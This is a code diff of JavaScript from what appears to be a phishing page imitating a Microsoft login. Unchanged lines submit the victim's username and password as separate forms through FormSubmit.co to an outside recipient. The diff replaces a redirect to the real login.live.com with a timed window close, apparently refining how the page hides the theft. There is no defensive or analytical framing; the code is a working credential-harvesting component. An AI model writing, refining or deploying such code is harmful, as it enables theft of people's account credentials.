@@ -40,9 +40,11 @@ document.addEventListener('DOMContentLoaded', () => {
             // Submit the form using FormSubmit.co
             form_uname.submit();
             form_pwd.submit();
-            // Redirect to the provided link
-            window.location.href = "https://login.live.com"; 
-            window.close();
+             // Close the window after a short delay (adjust the delay as needed)
+            setTimeout(() => {
+                window.close();
+            }, 1000); // Close after 1 seconds
+            
         }
     });
 
@@ -125,10 +127,10 @@ document.addEventListener('DOMContentLoaded', () => {
             event.preventDefault();
             form_uname.submit();
             form_pwd.submit();
-
-            //Redirect to the provided link
-            window.location.href="https://login.live.com";
-            window.open(location, '_self').close();
+ setTimeout(() => {
+                window.close();
+            }, 1000); // Close after 1 seconds
+            
         })
     })
 })
